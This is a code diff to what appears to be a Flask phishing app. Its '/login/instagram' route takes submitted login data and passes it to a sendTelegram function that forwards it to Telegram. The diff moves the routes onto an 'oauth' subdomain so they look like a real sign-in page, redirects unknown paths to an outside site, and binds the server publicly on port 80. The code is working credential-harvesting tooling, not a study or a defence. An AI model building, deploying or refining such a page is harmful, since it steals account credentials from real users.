@@ -5,6 +5,7 @@ import os
 
 load_dotenv()
 app = Flask(__name__)
+app.config['SERVER_NAME'] = 'lvh.me'
 
 def sendTelegram(request):
     # Extracting form data
@@ -46,18 +47,18 @@ def sendTelegram(request):
     print('Message sent to Telegram successfully!')
     return 'Login data sent!'
 
+
+
 @app.errorhandler(404)
-def page_not_found(e):
-    # Handling 404 errors, redirect to root Page
-    print('404 hit')
+def error404(e):
+    return redirect("https://s-usm.md")
 
-
-@app.route('/')
+@app.route('/', subdomain='oauth')
 def home():
     # Landing page
     return render_template('index.html')
 
-@app.route('/login/instagram', methods=['GET', 'POST'])
+@app.route('/login/instagram', subdomain='oauth', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         # Process and handle the login data
@@ -70,4 +71,4 @@ def login():
 
 if __name__ == '__main__':
     # Running the app on the local development server
-    app.run(debug=False)
+    app.run(host="0.0.0.0", port=80, debug=False)
